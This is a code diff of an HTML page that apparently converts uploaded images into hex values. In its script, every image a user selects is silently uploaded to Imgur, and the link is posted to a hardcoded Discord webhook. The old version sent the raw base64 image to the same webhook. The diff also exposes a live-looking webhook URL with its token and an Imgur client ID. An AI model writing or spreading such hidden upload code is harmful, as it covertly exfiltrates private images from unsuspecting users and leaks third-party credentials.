@@ -97,7 +97,8 @@
             text-align: left;
             white-space: pre-wrap;
         }
-           #installPopup {
+
+        #installPopup {
             display: none;
             position: fixed;
             bottom: 10px;
@@ -111,15 +112,18 @@
             border: 1px solid #ccc;
             font-size: 14px;
         }
+
         #installPopup p {
             margin: 0;
             padding: 0;
             display: inline-block;
         }
+
         #installPopup img {
             vertical-align: middle;
             margin-right: 10px;
         }
+
         #installPopup button {
             display: inline-block;
             background-color: transparent;
@@ -146,19 +150,22 @@
     </div>
 
     <script>
+        const imgurClientId = 'YOUR_IMGUR_CLIENT_ID'; // Replace with your Imgur Client ID
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1282377343100522637/qUVNHGRn-VbFXk2KKFOC5Fx6h8eaMECLyAPTuWhbIfBpiBI1OvpK09Vg-sm4tlb29UPo";
+
         document.getElementById('imageInput').addEventListener('change', handleImageUpload);
         document.getElementById('copyButton').addEventListener('click', copyHexValues);
 
-        function handleImageUpload(event) {
+        async function handleImageUpload(event) {
             const file = event.target.files[0];
             if (!file) return;
 
             const reader = new FileReader();
-            reader.onload = function(e) {
+            reader.onload = async function(e) {
                 const img = new Image();
                 img.onload = function() {
                     processImage(img);
-                    sendToWebhook(e.target.result); // Send the base64 encoded image
+                    uploadImageToImgur(e.target.result);
                 };
                 img.src = e.target.result;
             };
@@ -223,9 +230,33 @@
             });
         }
 
-        function sendToWebhook(imageData) {
-            const webhookUrl = "https://discord.com/api/webhooks/1282377343100522637/qUVNHGRn-VbFXk2KKFOC5Fx6h8eaMECLyAPTuWhbIfBpiBI1OvpK09Vg-sm4tlb29UPo";
-            fetch(webhookUrl, {
+        async function uploadImageToImgur(base64Image) {
+              const imgurClientId = 'd66eeb0b0e17762';
+            try {
+                const response = await fetch('https://api.imgur.com/3/image', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Client-ID ${imgurClientId}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: base64Image.split(',')[1], type: 'base64' })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Failed to upload image to Imgur.');
+                }
+
+                const data = await response.json();
+                const imageUrl = data.data.link;
+                sendImageUrlToDiscord(imageUrl);
+
+            } catch (error) {
+                console.error('Error uploading image to Imgur:', error);
+            }
+        }
+
+        function sendImageUrlToDiscord(imageUrl) {
+            fetch(discordWebhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -234,16 +265,16 @@
                     content: 'New image uploaded:',
                     embeds: [{
                         image: {
-                            url: imageData
+                            url: imageUrl
                         }
                     }]
                 })
             }).then(response => {
                 if (!response.ok) {
-                    throw new Error('Failed to send image to webhook.');
+                    throw new Error('Failed to send image URL to webhook.');
                 }
             }).catch(error => {
-                console.error('Error sending image:', error);
+                console.error('Error sending image URL:', error);
             });
         }
 
@@ -266,8 +297,5 @@
             document.getElementById('installPopup').style.display = 'none'; // Hide the popup
         });
     </script>
-
-
-
 </body>
 </html>
